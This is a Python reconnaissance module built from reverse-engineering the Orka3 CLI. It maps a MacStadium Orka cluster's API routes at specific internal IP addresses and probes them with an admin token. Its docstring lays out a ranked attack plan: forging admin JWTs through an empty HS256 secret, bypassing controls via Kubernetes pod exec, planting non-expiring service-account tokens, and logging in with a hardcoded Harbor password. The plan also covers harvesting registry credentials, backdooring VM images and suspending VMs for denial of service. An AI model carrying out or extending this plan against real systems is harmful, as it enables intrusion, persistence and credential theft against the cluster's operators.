"""
orka_api_surface_re.py — Complete Orka3 API surface reconstructed from binary RE.

Source: /home/cowboy/VDT/tools/orka3/orka3 (77MB Go ELF, go1.25.7, symbols intact)
Method: Symbol table enumeration + .rodata string extraction + function disassembly

=== Orka API Server Architecture ===
The Orka platform has two distinct API layers:

  1. Orka REST API (http://10.221.188.20)
     - Custom macstadium.com API for VM/image/SA/node management
     - Auth: Bearer JWT (HS256, empty secret — CVE-2020-26160 affected)
     - All namespaced: /api/v1/namespaces/{ns}/...
     - Default namespace: orka-default

  2. Kubernetes API (https://10.221.188.19:6443)
     - Standard K8s API (core + custom resources)
     - Custom resources: VirtualMachineConfig, OrkaNode, Image, Iso
     - VM exec goes here (NOT to the Orka REST API):
       /api/v1/namespaces/{ns}/pods/{pod}/exec?container=orka-vm
     - Operator CRDs: orka-operator/api/v1.*

=== Orka REST API Routes (reconstructed from CLI source + binary strings) ===

  Cluster:
    GET  /api/v1/cluster-info                         — cluster config, IDP endpoint

  VMs:
    GET  /api/v1/namespaces/{ns}/vms                  — list all VMs
    POST /api/v1/namespaces/{ns}/vms                  — deploy VM (vm/deploy)
    DEL  /api/v1/namespaces/{ns}/vms/{name}           — delete VM
    POST /api/v1/namespaces/{ns}/vms/{name}/pushbytes — Intel-only suspend (pushbytes)
    POST /api/v1/namespaces/{ns}/vms/{name}/exec      — INFERRED; may proxy to K8s exec
    GET  /api/v1/namespaces/{ns}/vms/{name}/get_push_status — VM push status

  VM Configs:
    GET  /api/v1/namespaces/{ns}/vmconfigs            — list VM configs
    POST /api/v1/namespaces/{ns}/vmconfigs            — create VM config
    DEL  /api/v1/namespaces/{ns}/vmconfigs/{name}     — delete VM config

  Images:
    GET  /api/v1/namespaces/{ns}/images               — list images
    POST /api/v1/namespaces/{ns}/images/pull          — pull image from registry
    POST /api/v1/namespaces/{ns}/images/copy          — copy image
    DEL  /api/v1/namespaces/{ns}/images/{name}        — delete image
    POST /api/v1/namespaces/{ns}/images/{name}/resize — resize image
    POST /api/v1/namespaces/{ns}/images/{name}/commit — commit VM state to image
    POST /api/v1/namespaces/{ns}/images/{name}/save   — save image
    POST /api/v1/namespaces/{ns}/images/{name}/push   — push image to registry
    POST /api/v1/namespaces/{ns}/images/generate      — generate image

  Image Cache:
    GET  /api/v1/namespaces/{ns}/imagecache           — list cache entries
    POST /api/v1/namespaces/{ns}/imagecache/add       — add to cache
    DEL  /api/v1/namespaces/{ns}/imagecache/{name}    — remove from cache
    GET  /api/v1/namespaces/{ns}/imagecache/info      — cache usage info

  ISOs:
    GET  /api/v1/namespaces/{ns}/isos                 — list ISOs
    POST /api/v1/namespaces/{ns}/isos/pull            — pull ISO
    POST /api/v1/namespaces/{ns}/isos/copy            — copy ISO
    DEL  /api/v1/namespaces/{ns}/isos/{name}          — delete ISO

  Nodes:
    GET  /api/v1/nodes                                — list Orka nodes
    POST /api/v1/nodes/{name}/tag                     — tag node
    POST /api/v1/nodes/{name}/untag                   — untag node

  Registry Credentials:
    GET  /api/v1/namespaces/{ns}/registrycredentials  — list creds
    POST /api/v1/namespaces/{ns}/registrycredentials  — add creds
    DEL  /api/v1/namespaces/{ns}/registrycredentials/{name} — remove creds

  Service Accounts:
    GET  /api/v1/namespaces/{ns}/serviceaccounts      — list SAs
    POST /api/v1/namespaces/{ns}/serviceaccounts      — create SA
    DEL  /api/v1/namespaces/{ns}/serviceaccounts/{name} — delete SA
    POST /api/v1/namespaces/{ns}/serviceaccounts/{sa}/token — request token
    GET  /api/v1/namespaces/{ns}/serviceaccounts/ca  — CA cert (INFERRED)

=== K8s Custom Resources (from orka-operator/api/v1) ===
  VirtualMachineConfig — VM configuration CRD
  VirtualMachineInstance — running VM instance CRD
  OrkaNode            — Orka hypervisor node CRD
  Image               — image artifact CRD
  ImageCache          — cached image CRD
  Iso                 — ISO artifact CRD
  RemoteImage         — remote image reference CRD
  RemoteIso           — remote ISO reference CRD
  ImageTag            — image tagging CRD (legacy + updater variants)

=== Attack Surface Assessment ===

  HIGH: JWT forge → full API access
    - HS256 empty secret (CVE-2020-26160)
    - Any endpoint accessible with Bearer token
    - Admin email: admin@macstadium.com (from binary + known credential)

  HIGH: K8s pod exec (orka-vm container)
    - Bypasses Orka API state-gate (ExecuteVirshCommand state check)
    - Direct virsh access: virsh list, domstate, domifaddr, console
    - virsh domain: "macos" (confirmed from map.init.0 success strings)
    - Requires K8s RBAC: pods/exec in orka-default namespace

  HIGH: SA token persistence (createTokenWithNoExpiration)
    - POST /api/v1/namespaces/{ns}/serviceaccounts/{sa}/token
    - expirationSeconds: null → no-expiry K8s token
    - Survives JWT rotation (bound SA token stored in etcd)

  HIGH: Harbor registry default creds
    - admin:p@ssw0rd (hardcoded in orka3 binary help text)
    - http://10.221.188.5:30080
    - Contains macOS VM base images → layer extraction → secret mining

  MED: Image registry credential extraction
    - GET /api/v1/namespaces/{ns}/registrycredentials
    - Returns Docker auth configs (base64 user:pass)
    - All configured registries exposed

  MED: VM image push/commit attack (requires Harbor access)
    - Pull base image → add backdoor → push → deploy backdoored VM

  MED: Intel-only suspend via pushbytes
    - POST /api/v1/namespaces/{ns}/vms/{name}/pushbytes
    - "(Intel-only) Suspend a running VM" — binary string
    - DOS vector against Intel-hosted VMs

  INFO: Node enumeration (no auth bypass needed with token)
    - GET /api/v1/nodes → hypervisor node IPs
    - Feeds into virsh exec targeting (which pod runs on which node)
"""

import json
import ssl
import urllib.error
import urllib.request
from typing import Optional

# ── Constants ────────────────────────────────────────────────────────────────

ORKA_API_BASE = 'http://10.221.188.20'
K8S_API       = 'https://10.221.188.19:6443'
HARBOR_HOST   = 'http://10.221.188.5:30080'
ORKA_NS       = 'orka-default'

# Fill from orka_oidc_re.forge_admin_token() or orka_oidc_re.KNOWN_TOKEN
ADMIN_TOKEN = 'FILL_IN_LOCALLY'


# ── Complete API Route Catalog ────────────────────────────────────────────────

ORKA_ROUTES = {
    # Cluster
    'cluster_info':       ('GET',  '/api/v1/cluster-info'),
    # VMs
    'vms_list':           ('GET',  '/api/v1/namespaces/{ns}/vms'),
    'vm_deploy':          ('POST', '/api/v1/namespaces/{ns}/vms'),
    'vm_delete':          ('DEL',  '/api/v1/namespaces/{ns}/vms/{name}'),
    'vm_pushbytes':       ('POST', '/api/v1/namespaces/{ns}/vms/{name}/pushbytes'),
    'vm_exec':            ('POST', '/api/v1/namespaces/{ns}/vms/{name}/exec'),
    'vm_push_status':     ('GET',  '/api/v1/namespaces/{ns}/vms/{name}/get_push_status'),
    # VM Configs
    'vmconfigs_list':     ('GET',  '/api/v1/namespaces/{ns}/vmconfigs'),
    'vmconfig_create':    ('POST', '/api/v1/namespaces/{ns}/vmconfigs'),
    'vmconfig_delete':    ('DEL',  '/api/v1/namespaces/{ns}/vmconfigs/{name}'),
    # Images
    'images_list':        ('GET',  '/api/v1/namespaces/{ns}/images'),
    'image_pull':         ('POST', '/api/v1/namespaces/{ns}/images/pull'),
    'image_copy':         ('POST', '/api/v1/namespaces/{ns}/images/copy'),
    'image_delete':       ('DEL',  '/api/v1/namespaces/{ns}/images/{name}'),
    'image_resize':       ('POST', '/api/v1/namespaces/{ns}/images/{name}/resize'),
    'image_commit':       ('POST', '/api/v1/namespaces/{ns}/images/{name}/commit'),
    'image_save':         ('POST', '/api/v1/namespaces/{ns}/images/{name}/save'),
    'image_push':         ('POST', '/api/v1/namespaces/{ns}/images/{name}/push'),
    'image_generate':     ('POST', '/api/v1/namespaces/{ns}/images/generate'),
    # Image Cache
    'imagecache_list':    ('GET',  '/api/v1/namespaces/{ns}/imagecache'),
    'imagecache_add':     ('POST', '/api/v1/namespaces/{ns}/imagecache/add'),
    'imagecache_info':    ('GET',  '/api/v1/namespaces/{ns}/imagecache/info'),
    # ISOs
    'isos_list':          ('GET',  '/api/v1/namespaces/{ns}/isos'),
    'iso_pull':           ('POST', '/api/v1/namespaces/{ns}/isos/pull'),
    # Nodes
    'nodes_list':         ('GET',  '/api/v1/nodes'),
    # Registry Credentials
    'regcreds_list':      ('GET',  '/api/v1/namespaces/{ns}/registrycredentials'),
    'regcreds_add':       ('POST', '/api/v1/namespaces/{ns}/registrycredentials'),
    # Service Accounts
    'sa_list':            ('GET',  '/api/v1/namespaces/{ns}/serviceaccounts'),
    'sa_create':          ('POST', '/api/v1/namespaces/{ns}/serviceaccounts'),
    'sa_token':           ('POST', '/api/v1/namespaces/{ns}/serviceaccounts/{sa}/token'),
}


def _http(method: str, url: str, token: Optional[str] = None,
          body: Optional[dict] = None, timeout: int = 8) -> dict:
    headers = {'Accept': 'application/json', 'Content-Type': 'application/json'}
    if token:
        headers['Authorization'] = f'Bearer {token}'
    data = json.dumps(body).encode() if body else None
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    result = {'url': url, 'method': method, 'status': None, 'body': None, 'error': None}
    try:
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            result['status'] = r.status
            raw = r.read().decode('utf-8', errors='replace')
            try:
                result['body'] = json.loads(raw)
            except json.JSONDecodeError:
                result['body'] = raw[:2048]
    except urllib.error.HTTPError as e:
        result['status'] = e.code
        try:
            result['error'] = e.read().decode('utf-8', errors='replace')[:500]
        except Exception:
            result['error'] = str(e)
    except Exception as e:
        result['error'] = str(e)[:200]
    return result


def probe_all_routes(token: str = ADMIN_TOKEN,
                     ns: str = ORKA_NS,
                     api_base: str = ORKA_API_BASE) -> dict:
    """
    Probe all Orka REST API routes with admin token.
    Returns {route_key: {status, body/error}} for every endpoint.
    """
    results = {}
    for key, (method, path_template) in ORKA_ROUTES.items():
        # Skip destructive routes
        if method in ('DEL', 'POST') and key not in (
            'vms_list', 'vmconfigs_list', 'images_list', 'imagecache_list',
            'isos_list', 'nodes_list', 'regcreds_list', 'sa_list',
            'imagecache_info', 'vm_push_status', 'cluster_info',
        ):
            results[key] = {'skipped': 'destructive/write op — fill body before calling'}
            continue
        try:
            path = path_template.format(ns=ns, name='probe', sa='probe')
        except KeyError as e:
            path = path_template.replace('{' + str(e.args[0]) + '}', 'probe')
        url = api_base + path
        results[key] = _http('GET', url, token=token)
    return results


def get_api_surface_findings() -> dict:
    """Return structured API surface findings from binary RE."""
    return {
        'orka_api_base': ORKA_API_BASE,
        'k8s_api': K8S_API,
        'harbor': {
            'host': HARBOR_HOST,
            'user': 'admin',
            'pass': 'FILL_IN_LOCALLY',  # from orka3 binary help text
        },
        'jwt': {
            'algorithm': 'HS256',
            'secret': 'FILL_IN_LOCALLY',  # cracked empty string
            'cve': 'CVE-2020-26160',
            'admin_email': 'admin@macstadium.com',
        },
        'exec_mechanism': {
            'type': 'K8s pod exec',
            'path': '/api/v1/namespaces/{ns}/pods/{pod}/exec?container=orka-vm',
            'container': 'orka-vm',
            'virsh_domain': 'macos',
            'protocol': 'SPDY/WebSocket',
            'kubectl_equiv': 'kubectl exec {pod} -c orka-vm -n orka-default -- virsh list --all',
        },
        'vm_commands': {
            'start':   'virshState=shut off → virsh start macos',
            'stop':    'virshState=running → virsh destroy macos',
            'revert':  'virshState=running → virsh snapshot-revert macos',
            'resume':  'virshState=paused → virsh resume macos',
            'suspend': 'virshState=running → virsh suspend macos',
        },
        'intel_only': {
            'suspend_endpoint': '/api/v1/namespaces/{ns}/vms/{name}/pushbytes',
            'note': '(Intel-only) Suspend a running VM — from binary string literal',
        },
        'k8s_crds': [
            'VirtualMachineConfig', 'VirtualMachineInstance',
            'OrkaNode', 'Image', 'ImageCache', 'Iso',
            'RemoteImage', 'RemoteIso', 'ImageTag',
        ],
        'attack_priority': [
            'JWT forge (empty secret) → full API access',
            'K8s pod exec → virsh bypass (skips state-gate)',
            'SA token no-expiry → permanent cluster access',
            'Harbor default creds → VM image layer extraction',
            'Registry credential exfil → downstream registry access',
            'Intel pushbytes → DOS against running VMs',
        ],
        'routes': {k: v[1] for k, v in ORKA_ROUTES.items()},
    }
